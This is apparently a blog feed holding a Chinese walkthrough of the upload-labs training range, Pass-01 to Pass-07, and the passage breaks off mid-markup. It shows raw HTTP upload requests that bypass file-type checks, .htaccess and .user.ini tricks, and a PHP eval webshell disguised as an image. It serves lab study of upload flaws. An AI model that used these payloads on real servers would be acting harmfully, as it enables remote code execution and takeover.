<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>upload-labs</title>
      <link href="/2022/02/28/upload-labs/"/>
      <url>/2022/02/28/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-files-学习"><a href="#upload-files-学习" class="headerlink" title="upload files 学习"></a>upload files 学习</h1><p>项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>测试环境</p><blockquote><p>操作系统：windows<br>php版本：5.2.17</p></blockquote><h2 id="Pass-o1"><a href="#Pass-o1" class="headerlink" title="Pass-o1"></a>Pass-o1</h2><p><strong>前端-js检查</strong>   </p><p>上马，如下提示</p><p> <img src="/2022/02/28/upload-labs/2022-02-28-10-43-51.png"></p><p> 猜测为前端检测，查看前端代码，白名单 <code>.jpg|.png|.gif</code></p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端检测的话，关闭js解析&#x2F;burp改包<br>1、关闭js解析</p><p><img src="/2022/02/28/upload-labs/2022-02-28-10-52-54.png"><br>2、burp改包 在filename该成需要的后缀即可绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-01/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">……</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload-labs/Pass-01/index.php</span><br><span class="line">Cookie: <span class="keyword">pass</span>=01</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; phpinfo();&lt;/script&gt;</span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure><p>都可以上传成功，然后找到蹄片右键复制地址<br><img src="/2022/02/28/upload-labs/2022-02-28-10-59-35.png"><br>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload-labs/upload/a.php 即木马地址</span><br></pre></td></tr></table></figure><p>访问，传🐎成功</p><p><img src="/2022/02/28/upload-labs/2022-02-28-11-02-07.png"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><strong>服务端-MIME文件类型检查</strong></p><p>直接上马被检测错误。<br>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>,<span class="string">&quot;02&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>burp改包，修改<code>Content-Type</code>，部分为 <code>image/jpeg</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-02/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">……</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; phpinfo();&lt;/script&gt;</span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">191691572411478</span>--</span><br></pre></td></tr></table></figure><p>上传成功，访问<br><img src="/2022/02/28/upload-labs/2022-02-28-11-13-41.png"></p><p><strong>背景知识：</strong></p><p><a href="https://www.php.net/manual/zh/features.file-upload.post-method.php">POST 方法上传</a></p><p>全局变量 $_FILES 包含有所有上传的文件信息。 数组的内容来自以下范例表单。我们假设文件上传字段的名称如下例所示，为 userfile。名称可随意命名。</p><blockquote><p><code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>  客户端机器文件的原名称。  </p><p><code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]</code>  文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“image&#x2F;gif”。不过此 MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。  </p><p><code>$_FILES[&#39;userfile&#39;][&#39;size&#39;]</code>  已上传文件的大小，单位为字节。</p><p><code>$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;]</code> 文件被上传后在服务端储存的临时文件名。</p><p><code>$_FILES[&#39;userfile&#39;][&#39;error&#39;]</code><br>和该文件上传相关的错误代码。</p></blockquote><p>文件被上传后，默认地会被储存到服务端的默认临时目录中，除非 php.ini 中的 upload_tmp_dir 设置为其它的路径。服务端的默认临时目录可以通过更改 PHP 运行环境的环境变量 TMPDIR 来重新设置，但是在 PHP 脚本内部通过运行 putenv() 函数来设置是不起作用的。该环境变量也可以用来确认其它的操作也是在上传的文件上进行的。</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>服务端-弱黑名单检查</strong><br>直接上马，提示错误<br>查看后端代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>,<span class="string">&quot;03&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span>. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                 <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>白名单检测，可以使用<code>php3/php5/phtml</code></p><p>以phtml为例，burp抓包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">293582696224464</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.phtml&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">293582696224464</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">293582696224464</span>--</span><br></pre></td></tr></table></figure><p>访问</p><p><img src="/2022/02/28/upload-labs/2022-02-28-11-44-16.png"></p><p>背景知识：<br>使用<code>php3/php5/phtml</code>成功的前提是服务端解析这些后缀，本地服务端修改方法是<br>找到apache下的conf&#x2F;httpd.conf，然后修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原数据</span><br><span class="line"><span class="comment">#AddType application/x-httpd-php .php .phtml</span></span><br><span class="line">去掉注释，修改为</span><br><span class="line">AddType application/x-httpd-php .php .phtml .php3 .php5</span><br></pre></td></tr></table></figure><p>其中 AddType 可以将给定的文件扩展名映射到指定的内容类型<br>用法：  </p><blockquote><p>AddType media-type extension [extension] …</p></blockquote><p>参考：</p><p><a href="https://blog.csdn.net/weixin_44023693/article/details/104754029">phpstudy无法解析php2、php3、phtml等文件</a><br><a href="https://www.tspweb.com/key/apache%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AE%9A%E4%B9%89.html">apache的配置文件中定义</a></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>服务端-强黑名单检查-修改.htaccess</strong><br>传马失败<br>看代码，黑到无人性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以上传<code>.htaccess</code>，覆盖原件，解析jpg文本里的php代码，内容为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>使用burp抓包查看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=04</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">168279961491</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">-----------------------------<span class="number">168279961491</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">168279961491</span>--</span><br></pre></td></tr></table></figure><p>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-12-15-57.png"></p><p><strong>背景知识：</strong></p><p>.htaccess<br> 可以实现网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。详见 <a href="http://www.htaccess-guide.com/">http://www.htaccess-guide.com/</a> 。</p><p>SetHandler 可以强制所有匹配的文件被一个指定的处理器处理<br>用法：<br>SetHandler handler-name|None<br>示例1：<br>SetHandler application&#x2F;x-httpd-php<br>此时当前目录及其子目录下所有文件都会被当做 php 解析</p><p><strong>参考：</strong>  </p><p><a href="https://www.tspweb.com/key/apache%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AE%9A%E4%B9%89.html">apache的配置文件中定义</a></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><strong>服务端-强黑名单检查-.user.ini绕过</strong><br>很多老版本的labs，这关是大小写绕过，别问我为什么知道的，逃。<br>黑名单没有禁止php7和.ini，所以可以修改.user.ini，来包含一个图片，内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;.user.ini&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">auto_prepend_file=shell.jpg</span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure><p>在上传一个shell.jpg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">@eval(<span class="params">$_REQUEST[<span class="string">&#x27;shell&#x27;</span>]</span>);</span></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">191691572411478</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后等待5min，访问upload下的readme.php<br><img src="/2022/02/28/upload-labs/2022-02-28-20-09-12.png">  </p><p><strong>补充知识：</strong><br>攻击逻辑链<br>.user.ini类似于php.ini，有初始化作用，可以更改一些包含文件，而.user.ini里面的auto_prepend_file，表示在加载第一个PHP代码之前先行预加载该配置所指示的PHP文件。也就是指定文件当作php解析包含。所以我们就可以上传一个图片🐎，然后在访问同目录下别的php文件利用此马。  </p><p>利用条件</p><blockquote><p>服务器脚本语言为PHP<br>服务器使用CGI／FastCGI模式   不知如何判断，待补<br>上传目录下要有可执行的php文件  这个蛮难的 </p></blockquote><p><a href="https://www.jianshu.com/p/c2ed6b05c964">参考知识：  </a>  </p><p><a href="https://www.jianshu.com/p/c2ed6b05c964">.user.ini配置文件在渗透中的利用</a><br><a href="https://www.php.net/manual/zh/configuration.file.per-user.php">.user.ini 文件</a><br><a href="https://www.zhihu.com/question/30672017">如何通俗地解释 CGI、FastCGI、php-fpm 之间的关系</a><br><a href="https://www.cnblogs.com/itbsl/p/9828776.html#%E6%B7%B1%E5%85%A5cgi%E5%8D%8F%E8%AE%AE">CGI 和 FastCGI 协议的运行原理</a><br><a href="https://segmentfault.com/a/1190000018597945">fastcgi与cgi有什么不同</a><br><a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">Upload-labs 1-21关 靶场通关攻略(全网最全最完整)</a></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><strong>服务端-强黑名单检查-大小写绕过</strong><br>后端代码未检查大小写，可以大小写绕过，转换小写函数<code>strtolower</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=06</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">123821742118716</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.Php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">123821742118716</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">123821742118716</span>--</span><br></pre></td></tr></table></figure><p>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-18-09-02.png"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><strong>服务端-强黑名单检查-尾部加空格绕过</strong><br>后端代码没有首位去空，去空函数<code>trim()</code><br>尾部加空格绕过，经测试首部加空格无法上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 